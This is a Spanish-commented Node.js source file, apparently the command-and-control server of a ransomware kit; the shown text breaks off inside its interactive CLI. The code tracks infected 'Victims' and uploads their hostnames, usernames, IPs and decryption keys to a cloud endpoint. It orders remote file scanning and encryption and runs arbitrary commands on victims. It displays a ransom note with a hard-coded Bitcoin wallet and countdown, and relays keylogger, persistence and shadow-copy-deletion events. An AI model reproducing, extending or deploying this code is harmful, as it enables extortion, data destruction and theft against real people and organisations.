const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const readline = require('readline');

// Global RL interface
global.rl = null;

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Helper para loguear y enviar a dashboards
function logServer(msg, type = 'info') {
  // Auto-detectar tipo basado en contenido textual (sin iconos)
  const lower = msg.toLowerCase();
  if (lower.includes('error') || lower.includes('fallo') || lower.includes('desconectado') || lower.includes('apagado')) type = 'error';
  else if (lower.includes('registrado') || lower.includes('conectado') || lower.includes('iniciado') || lower.includes('listo') || lower.includes('restaurados') || lower.includes('guardadas') || lower.includes('completado') || lower.includes('exito')) type = 'success';
  else if (lower.includes('advertencia') || lower.includes('warning')) type = 'warning';
  else if (lower.includes('comando') || lower.includes('ejecutando') || lower.includes('resultado') || lower.includes('enviando')) type = 'cmd';

  // Limpiar mensaje (Tildes y espacios)
  let cleanMsg = msg
    .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remover tildes
    .replace(/^\s+/, ''); // Trim start

  if (global.rl) {
    readline.clearLine(process.stdout, 0);
    readline.cursorTo(process.stdout, 0);
    console.log(cleanMsg);
    global.rl.prompt(true);
  } else {
    console.log(cleanMsg);
  }
  io.emit('server-log', { msg: cleanMsg, type, timestamp: Date.now() });
}

const PORT = process.env.PORT || 3000;

// Almacenar clientes conectados y claves
const clientesConectados = new Map();
const clavesPorCliente = new Map();

const KEYS_DIR = path.join(process.cwd(), 'keys');
if (!fs.existsSync(KEYS_DIR)) {
  fs.mkdirSync(KEYS_DIR, { recursive: true });
}

// ===============================
// CLOUD PERSISTENCE (Google Apps Script)
// ===============================
const GOOGLE_SCRIPT_URL = process.env.GOOGLE_SCRIPT_URL; // Set in Render ENV

async function syncToCloud(type, payload) {
  if (!GOOGLE_SCRIPT_URL) return;

  try {
    const data = JSON.stringify({ type, payload });
    const u = new URL(GOOGLE_SCRIPT_URL);

    const req = require('https').request({
      hostname: u.hostname,
      path: u.pathname + u.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    }, (res) => {
      // res.on('data', () => {}); // Consume stream
    });

    req.on('error', (e) => console.log(`[Cloud Sync Error] ${e.message}`));
    req.write(data);
    req.end();
  } catch (e) {
    console.log(`[Cloud Sync Failed] ${e.message}`);
  }
}

// ===============================
// GENERACION DE CLAVES RSA
// ===============================
const RSA_PRIVATE_PATH = path.join(KEYS_DIR, 'server_private.pem');
const RSA_PUBLIC_PATH = path.join(KEYS_DIR, 'server_public.pem');
let rsaPrivateKey = null;
let rsaPublicKey = null;

function generarClavesRSA() {
  if (fs.existsSync(RSA_PRIVATE_PATH) && fs.existsSync(RSA_PUBLIC_PATH)) {
    rsaPrivateKey = fs.readFileSync(RSA_PRIVATE_PATH, 'utf8');
    rsaPublicKey = fs.readFileSync(RSA_PUBLIC_PATH, 'utf8');
    console.log(' Claves RSA cargadas desde disco');
  } else {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    rsaPrivateKey = privateKey;
    rsaPublicKey = publicKey;
    fs.writeFileSync(RSA_PRIVATE_PATH, privateKey);
    fs.writeFileSync(RSA_PUBLIC_PATH, publicKey);
    logServer(' Nuevas claves RSA generadas y guardadas');
  }
}

function descifrarConRSA(encryptedBase64) {
  try {
    const buffer = Buffer.from(encryptedBase64, 'base64');
    const decrypted = crypto.privateDecrypt(
      {
        key: rsaPrivateKey,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: 'sha256'
      },
      buffer
    );
    return JSON.parse(decrypted.toString('utf8'));
  } catch (err) {
    console.error('Error descifrando RSA:', err.message);
    return null;
  }
}

function descifrarAES(encryptedHex, claveHex, ivHex) {
  try {
    const key = Buffer.from(claveHex, 'hex');
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
  } catch (e) {
    // console.error('Error descifrando AES:', e.message);
    return null;
  }
}

// Generar/cargar claves RSA al iniciar
generarClavesRSA();

function generarClaveCliente(clienteId, clienteName = null) {
  // Ensure keys directory exists
  if (!fs.existsSync(KEYS_DIR)) {
    fs.mkdirSync(KEYS_DIR, { recursive: true });
  }

  const key = crypto.randomBytes(32).toString('hex'); // 256 bits en hex
  // Use clienteName for filename if provided, otherwise use clienteId
  const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const filePath = path.join(KEYS_DIR, `${safeName}_key.txt`);
  fs.writeFileSync(filePath, `ClienteId: ${clienteId}\nNombre: ${clienteName || 'Unknown'}\nClave: ${key}\nFecha: ${new Date().toISOString()}`, 'utf8');
  clavesPorCliente.set(clienteId, key);
  console.log(` Clave generada para: ${clienteName || clienteId}`);
  return key;
}

function obtenerClaveCliente(clienteId, clienteName = null) {
  if (clavesPorCliente.has(clienteId)) return clavesPorCliente.get(clienteId);

  // Try to find by name first
  const safeName = (clienteName || clienteId).replace(/[^a-zA-Z0-9_-]/g, '_');
  const filePath = path.join(KEYS_DIR, `${safeName}_key.txt`);

  if (fs.existsSync(filePath)) {
    const content = fs.readFileSync(filePath, 'utf8');
    const match = content.match(/Clave: ([a-f0-9]+)/);
    if (match) {
      const key = match[1];
      clavesPorCliente.set(clienteId, key);
      console.log(` Clave recuperada para: ${clienteName || clienteId}`);
      return key;
    }
  }
  return generarClaveCliente(clienteId, clienteName);
}

// Middleware para parsear JSON
app.use(express.json());
app.use(express.static('public'));

// Funcion para ejecutar comandos en CMD
function ejecutarComando(comando) {
  return new Promise((resolve, reject) => {
    // Usar cmd.exe con /c para ejecutar el comando
    exec(`cmd.exe /c ${comando}`, {
      cwd: process.cwd(),
      encoding: 'utf8',
      maxBuffer: 1024 * 1024 * 10 // 10MB buffer
    }, (error, stdout, stderr) => {
      if (error) {
        // Si hay error pero hay stdout, todavia devolver stdout
        resolve({
          exitCode: error.code || 1,
          stdout: stdout || '',
          stderr: stderr || error.message || '',
          error: error.message || ''
        });
      } else {
        resolve({
          exitCode: 0,
          stdout: stdout || '',
          stderr: stderr || ''
        });
      }
    });
  });
}

// Ruta POST para ejecutar comandos
app.post('/api/ejecutar', async (req, res) => {
  const { comando } = req.body;

  if (!comando || typeof comando !== 'string') {
    return res.status(400).json({
      error: 'Se requiere un comando valido en el cuerpo de la peticion',
      ejemplo: { comando: 'dir' }
    });
  }

  logServer(`Ejecutando comando: ${comando}`);

  try {
    const resultado = await ejecutarComando(comando);
    res.json({
      success: true,
      comando: comando,
      resultado: resultado
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Ruta GET para verificar estado
app.get('/api/status', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    clients: clientesConectados.size,
    mensaje: 'Servidor C2 Activo'
  });
});

// Ruta POST para apagar el servidor
app.post('/api/shutdown', (req, res) => {
  res.json({ success: true, message: 'Apagando servidor...' });
  console.log('🛑 Servidor apagado remotamente desde el dashboard.');

  // Dar tiempo a enviar la respuesta
  setTimeout(() => {
    process.exit(0);
  }, 1000);
});

// ===============================
// SECURITY API ENDPOINTS
// ===============================

// Keylogger endpoints removed

// Security and File Manager endpoints removed

// Ruta GET para obtener lista de clientes conectados
app.get('/api/clientes', (req, res) => {
  res.json({
    success: true,
    clientes: Array.from(clientesConectados.values())
  });
});

// File list endpoint removed

// Solicitar cifrado de archivo al cliente
app.post('/api/cifrar-archivo', async (req, res) => {
  const { clienteId, filePath } = req.body;
  if (!clienteId || !clientesConectados.has(clienteId)) {
    return res.status(400).json({ error: 'clienteId invalido o no conectado' });
  }
  if (!filePath) {
    return res.status(400).json({ error: 'filePath requerido' });
  }

  const clave = obtenerClaveCliente(clienteId);
  const respuestaPromise = new Promise((resolve) => {
    const comandoId = Date.now().toString();
    const timeout = setTimeout(() => {
      resolve({ success: false, error: 'Timeout al cifrar archivo' });
    }, 120000);

    const handler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === comandoId) {
        clearTimeout(timeout);
        io.off('archivo-cifrado', handler);
        resolve({ success: true, ...data });
      }
    };

    io.on('archivo-cifrado', handler);
    io.to(clienteId).emit('cifrar-archivo', { comandoId, filePath, clave });
  });

  const respuesta = await respuestaPromise;
  res.json(respuesta);
});

// Solicitar escaneo de archivos objetivo al cliente
app.post('/api/escanear-archivos', async (req, res) => {
  const { clienteId } = req.body;
  if (!clienteId || !clientesConectados.has(clienteId)) {
    return res.status(400).json({ error: 'clienteId invalido o no conectado' });
  }

  const respuestaPromise = new Promise((resolve) => {
    const comandoId = Date.now().toString();
    const timeout = setTimeout(() => {
      resolve({ success: false, error: 'Timeout al escanear archivos' });
    }, 60000); // 60 segundos para escaneos grandes

    const handler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === comandoId) {
        clearTimeout(timeout);
        io.off('archivos-escaneados', handler);

        // Descifrar si viene cifrado
        if (data.encrypted && data.algorithm === 'aes-256-cbc') {
          const cliente = clientesConectados.get(clienteId);
          if (cliente && cliente.claveAESCliente) {
            try {
              const key = Buffer.from(cliente.claveAESCliente, 'hex');
              const iv = Buffer.from(data.iv, 'hex');
              const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
              const decrypted = Buffer.concat([
                decipher.update(Buffer.from(data.data, 'base64')),
                decipher.final()
              ]);
              const resultado = JSON.parse(decrypted.toString('utf8'));

              // Guardar resultado en archivo
              const scanPath = path.join(KEYS_DIR, `${clienteId}_scan.json`);
              fs.writeFileSync(scanPath, JSON.stringify(resultado, null, 2));
              console.log(` Escaneo guardado en: ${scanPath}`);

              resolve({ success: true, resultado });
            } catch (error) {
              resolve({ success: false, error: 'Error descifrando resultado: ' + error.message });
            }
          } else {
            resolve({ success: false, error: 'No hay clave AES del cliente' });
          }
        } else if (!data.encrypted) {
          // Sin cifrar - usar resumenBasico si existe
          resolve({ success: true, resultado: data.resumenBasico || data });
        } else if (data.resumenBasico) {
          // Cifrado pero con resumenBasico (lista de archivos sin cifrar)
          resolve({ success: true, resultado: data.resumenBasico });
        } else if (data.error) {
          resolve({ success: false, error: data.error });
        }
      }
    };

    io.on('archivos-escaneados', handler);
    io.to(clienteId).emit('escanear-archivos', { comandoId });
  });

  const respuesta = await respuestaPromise;
  res.json(respuesta);
});

// Solicitar cifrado de archivos objetivo al cliente
app.post('/api/cifrar-archivos', async (req, res) => {
  const { clienteId, limite } = req.body;
  if (!clienteId || !clientesConectados.has(clienteId)) {
    return res.status(400).json({ error: 'clienteId invalido o no conectado' });
  }

  const respuestaPromise = new Promise((resolve) => {
    const comandoId = Date.now().toString();
    const timeout = setTimeout(() => {
      resolve({ success: false, error: 'Timeout al cifrar archivos' });
    }, 120000); // 2 minutos

    const handler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === comandoId) {
        clearTimeout(timeout);
        io.off('cifrado-completado', handler);

        if (data.error) {
          resolve({ success: false, error: data.error });
        } else {
          // Guardar log del cifrado
          const logPath = path.join(KEYS_DIR, `${clienteId}_encrypt_log.json`);
          fs.writeFileSync(logPath, JSON.stringify({
            timestamp: new Date().toISOString(),
            resumen: data.resumenBasico,
            metadatos: data.metadatos,
            archivos: data.archivosCifrados
          }, null, 2));

          // Sync to Cloud DB (Encrypted)
          const cliente = clientesConectados.get(clienteId);
          syncToCloud('Encrypted', {
            uuid: cliente?.uuid || clienteId,
            hostname: cliente?.hostname || 'Unknown',
            totalCifrados: data.resumenBasico?.totalCifrados || 0,
            totalErrores: data.resumenBasico?.totalErrores || 0,
            archivos: (data.archivosCifrados || []).slice(0, 20).map(a => a.nombre),
            timestamp: new Date().toISOString()
          });

          resolve({
            success: true,
            resumen: data.resumenBasico,
            metadatos: data.metadatos,
            archivosCifrados: data.archivosCifrados
          });
        }
      }
    };

    io.on('cifrado-completado', handler);
    io.to(clienteId).emit('cifrar-archivos-objetivo', { comandoId, limite: limite || 100 });
  });

  const respuesta = await respuestaPromise;
  res.json(respuesta);
});

// Solicitar descifrado de archivos al cliente
app.post('/api/descifrar-archivos', async (req, res) => {
  const { clienteId } = req.body;
  if (!clienteId || !clientesConectados.has(clienteId)) {
    return res.status(400).json({ error: 'clienteId invalido o no conectado' });
  }

  const respuestaPromise = new Promise((resolve) => {
    const comandoId = Date.now().toString();
    const timeout = setTimeout(() => {
      resolve({ success: false, error: 'Timeout al descifrar archivos' });
    }, 120000);

    const handler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === comandoId) {
        clearTimeout(timeout);
        io.off('descifrado-completado', handler);

        if (data.error) {
          resolve({ success: false, error: data.error });
        } else {
          resolve({
            success: true,
            totalDescifrados: data.totalDescifrados,
            totalErrores: data.totalErrores
          });
        }
      }
    };

    io.on('descifrado-completado', handler);
    io.to(clienteId).emit('descifrar-archivos', { comandoId });
  });

  const respuesta = await respuestaPromise;
  res.json(respuesta);
});

// Solicitar mostrar nota de rescate al cliente
app.post('/api/mostrar-nota', async (req, res) => {
  const { clienteId, wallet, amount, hours, minutes, seconds, files } = req.body;
  if (!clienteId || !clientesConectados.has(clienteId)) {
    return res.status(400).json({ error: 'clienteId invalido o no conectado' });
  }

  const respuestaPromise = new Promise((resolve) => {
    const comandoId = Date.now().toString();
    const timeout = setTimeout(() => {
      resolve({ success: false, error: 'Timeout al mostrar nota' });
    }, 10000);

    const handler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === comandoId) {
        clearTimeout(timeout);
        io.off('nota-rescate-mostrada', handler);
        resolve(data);
      }
    };

    io.on('nota-rescate-mostrada', handler);
    io.to(clienteId).emit('mostrar-nota-rescate', {
      comandoId,
      wallet: wallet || '1KP72fBmh3XBRfuJDMn53APaqM6iMRspCh',
      amount: amount || '2',
      hours: hours || 71,
      minutes: minutes || 57,
      seconds: seconds || 22,
      files: files || 0
    });
  });

  const respuesta = await respuestaPromise;
  res.json(respuesta);
});

// Ruta POST para ejecutar comandos remotamente
app.post('/api/ejecutar-remoto', async (req, res) => {
  const { clienteId, comando } = req.body;

  if (!clienteId || !comando || typeof comando !== 'string') {
    return res.status(400).json({
      error: 'Se requiere clienteId y comando validos',
      ejemplo: { clienteId: 'cliente-id', comando: 'dir' }
    });
  }

  if (!clientesConectados.has(clienteId)) {
    return res.status(404).json({
      error: 'Cliente no encontrado o desconectado'
    });
  }

  logServer(`Enviando comando a cliente ${clienteId}: ${comando}`);

  // Crear promesa para esperar respuesta del cliente
  const respuestaPromise = new Promise((resolve) => {
    const timeout = setTimeout(() => {
      resolve({
        success: false,
        error: 'Timeout: El cliente no respondio en 2 minutos'
      });
    }, 120000);

    const respuestaHandler = (data) => {
      if (data.clienteId === clienteId && data.comandoId === req.body.comandoId) {
        clearTimeout(timeout);
        io.off('comando-resultado', respuestaHandler);
        resolve(data);
      }
    };

    io.on('comando-resultado', respuestaHandler);
  });

  // Enviar comando al cliente
  const comandoId = req.body.comandoId || Date.now().toString();
  io.to(clienteId).emit('ejecutar-comando', {
    comando: comando,
    comandoId: comandoId
  });

  const resultado = await respuestaPromise;

  if (resultado.success === false || resultado.error) {
    res.json(resultado);
  } else {
    res.json({
      success: true,
      ...resultado
    });
  }
});

// Configuracion de WebSockets
io.on('connection', (socket) => {
  // No loguear aqui - pueden ser dashboards o clientes reales
  // Solo logueamos cuando el cliente se registra

  // Cliente se registra
  socket.on('registrar-cliente', (data) => {
    // 1. Identificacion unica
    const uuid = data.uuid || socket.id; // Fallback para clientes viejos

    // 2. Comprobar si ya existe (Deduplicacion)
    // Buscamos si hay algun socket asociado a este UUID
    let existingSocketId = null;
    for (const [id, cliente] of clientesConectados.entries()) {
      if (cliente.uuid === uuid) {
        existingSocketId = id;
        break;
      }
    }

    // Si existe, eliminamos la referencia anterior (el socket viejo ya debio desconectarse)
    if (existingSocketId) {
      clientesConectados.delete(existingSocketId);
      console.log(` Renovando sesion para UUID: ${uuid}`);
    }

    // 3. Crear Info Cliente extendida
    const infoCliente = {
      id: socket.id, // El socket actual
      uuid: uuid,    // Identidad persistente
      nombre: data.nombre || `Cliente-${socket.id.substring(0, 8)}`,
      hostname: data.hostname || 'Desconocido',
      platform: data.platform || 'Desconocido',
      arch: data.arch || 'Desconocido',
      username: data.username || 'N/A', // Nuevo campo
      ip: data.ip || 'Unknown',         // Nuevo campo
      timestamp: new Date().toISOString()
    };

    clientesConectados.set(socket.id, infoCliente);

    // Asignar/obtener clave AES para este cliente usando hostname para el nombre del archivo
    const clave = obtenerClaveCliente(socket.id, infoCliente.hostname);

    // Enviar datos de registro incluyendo la clave publica RSA
    socket.emit('registrado', {
      clienteId: socket.id,
      clave,
      rsaPublicKey: rsaPublicKey
    });

    // Notificar a todos los clientes web sobre el nuevo cliente
    io.emit('cliente-conectado', infoCliente);
    logServer(` Cliente registrado: ${infoCliente.nombre} [${infoCliente.username}@${infoCliente.ip}]`);

    // Sync to Cloud DB (Victims)
    syncToCloud('Victims', {
      uuid: infoCliente.uuid,
      socketId: socket.id,
      hostname: infoCliente.hostname,
      username: infoCliente.username,
      ip: infoCliente.ip,
      platform: infoCliente.platform,
      arch: infoCliente.arch,
      status: 'connected',
      timestamp: infoCliente.timestamp
    });
  });

  // Recibir clave AES cifrada del cliente
  socket.on('clave-aes-cliente', (data) => {
    console.log(` Clave AES del cliente recibida de ${socket.id}`);

    try {
      // Descifrar la clave AES con RSA privada
      const claveAESBuffer = crypto.privateDecrypt(
        {
          key: rsaPrivateKey,
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
          oaepHash: 'sha256'
        },
        Buffer.from(data.claveAESCifrada, 'base64')
      );

      const claveAESHex = claveAESBuffer.toString('hex');

      // Guardar clave AES del cliente
      const cliente = clientesConectados.get(socket.id);
      if (cliente) {
        cliente.claveAESCliente = claveAESHex;
        clientesConectados.set(socket.id, cliente);
      }

      // Guardar en archivo
      const keyPath = path.join(KEYS_DIR, `${socket.id}_aes_cliente.txt`);
      fs.writeFileSync(keyPath, claveAESHex);
      console.log(` Clave AES del cliente guardada (${claveAESHex.substring(0, 16)}...)`);

      // Sync to Cloud DB (Keys)
      if (cliente) {
        syncToCloud('Keys', {
          socketId: socket.id,
          uuid: cliente.uuid,
          hostname: cliente.hostname,
          aesKey: claveAESHex,
          timestamp: new Date().toISOString()
        });
      }

    } catch (error) {
      console.error(' Error descifrando clave AES del cliente:', error.message);
    }
  });

  // Recibir informacion del sistema (cifrada con AES o RSA)
  socket.on('info-sistema', (data) => {
    logServer(` Informacion del sistema recibida de ${socket.id}`);

    let infoSistema = data;

    // Si viene cifrada
    if (data.encrypted) {
      if (data.algorithm === 'aes-256-cbc') {
        // Descifrar con clave AES
        const cliente = clientesConectados.get(socket.id);
        // Intentar con clave del cliente primero, luego con clave del servidor
        let claveHex = cliente?.claveAESCliente || clavesPorCliente.get(socket.id);

        if (!claveHex && cliente?.hostname) {
          // Buscar clave por hostname en archivo
          const keyPath = path.join(KEYS_DIR, `${cliente.hostname}_key.txt`);
          if (fs.existsSync(keyPath)) {
            claveHex = fs.readFileSync(keyPath, 'utf8').trim();
          }
        }

        if (claveHex) {
          try {
            const key = Buffer.from(claveHex, 'hex');
            const iv = Buffer.from(data.iv, 'hex');
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            const decrypted = Buffer.concat([
              decipher.update(Buffer.from(data.data, 'base64')),
              decipher.final()
            ]);
            infoSistema = JSON.parse(decrypted.toString('utf8'));
          } catch (error) {
            console.error(' Error descifrando con AES:', error.message);
            // Guardar datos cifrados como fallback
          }
        } else {
          console.log(' Info del sistema recibida cifrada pero sin clave disponible');
        }
      } else if (data.algorithm === 'rsa') {
        // Descifrar con RSA
        infoSistema = descifrarConRSA(data.data);
        if (!infoSistema) {
          console.error(' Error descifrando informacion del sistema');
          return;
        }
      }
    }

    // Guardar informacion del sistema en el cliente
    const cliente = clientesConectados.get(socket.id);
    if (cliente) {
      cliente.sistemaInfo = infoSistema;
      clientesConectados.set(socket.id, cliente);

      // Guardar en archivo
      const infoPath = path.join(KEYS_DIR, `${socket.id}_sysinfo.json`);
      fs.writeFileSync(infoPath, JSON.stringify(infoSistema, null, 2));
      console.log(` Info guardada en: ${infoPath}`);
    }

    // Notificar a la UI web
    io.emit('cliente-info-actualizada', {
      clienteId: socket.id,
      sistemaInfo: infoSistema
    });
  });

  // Recibir resultado de comando ejecutado
  socket.on('comando-resultado', (data) => {
    logServer(` Resultado de comando de ${socket.id}`);

    // Imprimir output en CLI local
    if (global.rl) {
      const out = data.output || data.stdout || (data.stderr ? `Error: ${data.stderr}` : null);
      if (out) {
        readline.clearLine(process.stdout, 0);
        readline.cursorTo(process.stdout, 0);
        console.log(out);
        global.rl.prompt(true);
      }
    }

    io.emit('comando-resultado', data);
    // Tambien emitir como actividad generica
    io.emit('actividad-cliente', {
      tipo: 'comando',
      clienteId: socket.id,
      mensaje: `Comando ejecutado`,
      datos: data
    });
  });

  // Recibir resultado de escaneo de archivos
  socket.on('archivos-escaneados', (data) => {
    let resultado = data;

    // Intentar descifrar si viene cifrado
    if (data.iv && data.data && clavesPorCliente.has(socket.id)) {
      const dec = descifrarAES(data.data, clavesPorCliente.get(socket.id), data.iv);
      if (dec) resultado = dec;
    } else if (data.data && !data.iv) {
      // Wrapper sin cifrar
      resultado = data.data;
    }

    // Extraer resumen
    const total = resultado.total || (resultado.resumenBasico ? resultado.resumenBasico.total : 0);
    const tamanio = resultado.tamanioTotalHumano || (resultado.resumenBasico ? resultado.resumenBasico.tamanioTotalHumano : '0 B');

    logServer(` Escaneo completado de ${socket.id}: ${total} archivos (${tamanio})`);

    // Listar archivos tipo DIR
    if (resultado.archivos && Array.isArray(resultado.archivos)) {
      logServer("");
      logServer(` Directorio de ${socket.id}`);
      logServer("Fecha               <DIR>      Size      Nombre");
      logServer("------------------- ---------  --------  ------------------------");

      resultado.archivos.forEach(f => {
        let dateStr = "Unknown";
        try {
          if (f.fechaMod) dateStr = new Date(f.fechaMod).toISOString().replace("T", " ").substring(0, 19);
        } catch (e) { }

        const dirStr = f.esDirectorio ? "<DIR>" : "     ";
        const sizeStr = f.esDirectorio ? "" : (f.tamanioHumano || "0");
        const name = f.nombre || (f.ruta ? path.basename(f.ruta) : "???");

        logServer(`${dateStr}   ${dirStr}   ${sizeStr.padEnd(8)}  ${name}`);
      });
      logServer("");
      logServer(`              ${total} Archivos(s)             ${tamanio}`);
      logServer("");
    }

    io.emit('archivos-escaneados', data);
    io.emit('actividad-cliente', {
      tipo: 'escaneo',
      clienteId: socket.id,
      mensaje: `Escaneo: ${total} archivos encontrados (${tamanio})`,
      datos: data
    });
  });

  // Recibir resultado de cifrado
  socket.on('cifrado-completado', (data) => {
    // Extraer de resumenBasico si esta cifrado
    let totalCifrados = 0;
    let totalErrores = 0;

    if (data.resumenBasico) {
      totalCifrados = data.resumenBasico.totalCifrados || 0;
      totalErrores = data.resumenBasico.totalErrores || 0;
    } else if (data.data) {
      totalCifrados = data.data.totalCifrados || 0;
      totalErrores = data.data.totalErrores || 0;
    }

    logServer(` Cifrado completado de ${socket.id}: ${totalCifrados} archivos (${totalErrores} errores)`);
    io.emit('cifrado-completado', data);
    io.emit('actividad-cliente', {
      tipo: 'cifrado',
      clienteId: socket.id,
      mensaje: `Cifrado: ${totalCifrados} archivos cifrados (${totalErrores} errores)`,
      datos: data
    });
  });

  // Recibir resultado de descifrado
  socket.on('descifrado-completado', (data) => {
    // totalDescifrados ya viene en texto plano
    let totalDescifrados = data.totalDescifrados || 0;
    let totalErrores = data.totalErrores || 0;

    logServer(` Descifrado completado de ${socket.id}: ${totalDescifrados} archivos restaurados`);
    io.emit('descifrado-completado', data);
    io.emit('actividad-cliente', {
      tipo: 'descifrado',
      clienteId: socket.id,
      mensaje: `Descifrado: ${totalDescifrados} archivos restaurados (${totalErrores} errores)`,
      datos: data
    });
  });

  // Recibir confirmacion de nota de rescate
  socket.on('nota-rescate-mostrada', (data) => {
    logServer(` Nota de rescate mostrada en ${socket.id}`);
    io.emit('nota-rescate-mostrada', data);
    io.emit('actividad-cliente', {
      tipo: 'nota-rescate',
      clienteId: socket.id,
      mensaje: `Nota de rescate desplegada`,
      datos: data
    });
  });

  // Recibir resultado de cifrado de archivo individual
  socket.on('archivo-cifrado', (data) => {
    io.emit('archivo-cifrado', data);
  });

  // Recibir y guardar metadatos de cifrado de archivos
  socket.on('guardar-metadatos-cifrado', (data) => {
    try {
      const hostname = data.hostname || 'unknown';
      const hostDir = path.join(KEYS_DIR, hostname);

      // Crear directorio del hostname si no existe
      if (!fs.existsSync(hostDir)) {
        fs.mkdirSync(hostDir, { recursive: true });
        console.log(` Creada carpeta de metadatos: ${hostDir}`);
      }

      // Nombre del archivo: nombre_original_timestamp.json
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const nombreBase = data.archivoOriginal.replace(/[^a-zA-Z0-9.-]/g, '_');
      const metaFileName = `${nombreBase}_${timestamp}.json`;
      const metaPath = path.join(hostDir, metaFileName);

      // Guardar metadatos
      fs.writeFileSync(metaPath, JSON.stringify(data, null, 2));
      console.log(` Metadatos guardados: ${metaPath}`);

      // Notificar a la UI
      io.emit('actividad-cliente', {
        tipo: 'metadatos-cifrado',
        clienteId: socket.id,
        mensaje: `Metadatos de ${data.archivoOriginal} guardados`,
        datos: { archivo: data.archivoOriginal, iv: data.iv }
      });
    } catch (error) {
      console.error(' Error guardando metadatos de cifrado:', error.message);
    }
  });

  // ===============================
  // SECURITY EVENT HANDLERS
  // ===============================

  // Keylogger data
  socket.on('keylog-data', (data) => {
    io.emit('keylog-data', data);
  });

  // Keylogger status
  socket.on('keylogger-status', (data) => {
    io.emit('keylogger-status', data);
    console.log(` Keylogger ${data.status} en ${socket.id}`);
  });

  // Persistence status
  socket.on('persistence-status', (data) => {
    io.emit('persistence-status', data);
    console.log(` Estado de persistencia recibido de ${socket.id}`);
  });

  // Persistence restored
  socket.on('persistence-restored', (data) => {
    io.emit('persistence-restored', data);
    console.log(` Persistencia restaurada en ${socket.id}`);
  });

  // Shadow copies status
  socket.on('shadows-status', (data) => {
    io.emit('shadows-status', data);
    console.log(` Estado de VSS recibido de ${socket.id}`);
  });

  // Shadow copies deleted
  socket.on('shadows-deleted', (data) => {
    io.emit('shadows-deleted', data);
    console.log(` Shadow copies eliminadas en ${socket.id}`);
  });

  // Shadow copies created
  socket.on('shadows-created', (data) => {
    io.emit('shadows-created', data);
    console.log(` Shadow copy creada en ${socket.id}`);
  });

  // Cliente desconectado
  socket.on('disconnect', () => {
    const clienteInfo = clientesConectados.get(socket.id);
    if (clienteInfo) {
      clientesConectados.delete(socket.id);
      io.emit('cliente-desconectado', { id: socket.id });
      io.emit('actividad-cliente', {
        tipo: 'desconexion',
        clienteId: socket.id,
        mensaje: `Cliente desconectado: ${clienteInfo.nombre}`
      });
      logServer(` Cliente desconectado: ${clienteInfo.nombre}`);
    }
  });
});

// Iniciar servidor
server.listen(PORT, () => {
  logServer(`\n Servidor de comandos CMD iniciado!`);
  logServer(` HTTP escuchando en: http://localhost:${PORT}`);
  logServer(` WebSocket habilitado para conexiones remotas`);
  logServer(`\n El servidor esta listo para ejecutar comandos\n`);
});

// Manejo de errores no capturados
process.on('uncaughtException', (error) => {
  console.error('Error no capturado:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Promesa rechazada no manejada:', reason);
});

// ===============================
// INTERFAZ DE COMANDOS LOCAL (CLI)
// ===============================
global.rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: 'C2> '
});

let cliTarget = null; // Cliente seleccionado en CLI

global.rl.on('line', (line) => {
  const input = line.trim();
  if (!input) { global.rl.prompt(); return; }

  const parts = input.split(' ');
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  if (!cliTarget) {
    // --- MODO GLOBAL ---
    if (cmd === 'list' || cmd === 'ls') {
      const clientes = Array.from(clientesConectados.values());
      console.log('\n--- Clientes Conectados ---');
      if (clientes.length === 0) console.log(" (Ninguno)");
      clientes.forEach((c, i) => {
        console.log(` [${i}] ID: ${c.id} | Nombre: ${c.nombre} | IP: ${c.ip}`);
      });
      console.log('---------------------------\n');
    }
    else if (cmd === 'use' || cmd === 'select') {
      const target = args[0];
      if (!target) { console.log("Uso: use <index/id/nombre>"); }
      else {
        const clientes = Array.from(clientesConectados.values());
        // Intentar por índice
        if (!isNaN(target) && clientes[parseInt(target)]) {
          cliTarget = clientes[parseInt(target)];
        } else {
          // Intentar por ID o Nombre exacto
          cliTarget = clientes.find(c => c.id === target || c.nombre === target);
        }

        if (cliTarget) {
          console.log(`\n[+] Cliente seleccionado: ${cliTarget.nombre} (${cliTarget.id})`);
          global.rl.setPrompt(`C2/${cliTarget.nombre}> `);
        } else {
          console.log('\n[-] Cliente no encontrado.');
        }
      }
    }
    else if (cmd === 'help' || cmd === '?') {
      console.log(`
         Comandos Globales:
          list             - Listar clientes
          use <id/idx>     - Seleccionar cliente
          cls              - Limpiar pantalla
          exit             - Salir del servidor
         `);
    }
    else if (cmd === 'cls' || cmd === 'clear') {
      console.clear();
    }
    else if (cmd === 'exit') {
      process.exit(0);
    }
    else {
      console.log("Comando desconocido. Usa 'help'.");
    }
  } else {
    // --- MODO CLIENTE ---
    if (cmd === 'back' || cmd === 'exit') {
      cliTarget = null;
      global.rl.setPrompt('C2> ');
      console.log('\n[+] Regresando a modo global.');
    }
    else if (cmd === 'info') {
      console.log(cliTarget);
    }
